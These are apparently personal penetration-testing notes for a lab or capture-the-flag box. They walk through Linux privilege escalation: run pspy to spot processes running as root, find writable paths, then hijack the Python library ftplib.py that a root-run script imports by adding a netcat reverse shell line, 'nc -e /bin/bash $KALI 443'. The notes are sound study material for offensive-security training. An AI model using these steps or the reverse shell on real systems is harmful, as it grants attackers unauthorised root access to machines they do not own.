32 or 64?
```bash - target
uname -a
```

32 download
```bash - kali
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32
```

64 download
```bash - kali
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
```

transfer to Target

![[Python#Server]]

```bash - target
chmod +x pspy64
```

```bash - target
./pspy64
```

Look at the output, look for any UID=0, as this is the root user.  Look for any commands that are calling a file / script that we may have write privileges to.

![[Pasted image 20211229224921.png | 1000]]

```bash - target
find / -writable -type d 2>/dev/null
```

![[Pasted image 20221110104834.png]]

```bash - target
cat /opt/ftpclient/ftpclient.py
```

```bash - kali
cd /usr/lib/python2.7
```

Check if we have read / write privs:
```bash - kali
ls -lah ftplib.py
```

Open the file, and put in a reverse shell command:
```bash - kali
nano ftplib.py
```

![[rlwrap]]

```python - kali
os.system("nc -e /bin/bash $KALI 443")
```

![[Pasted image 20211229225151.png]]










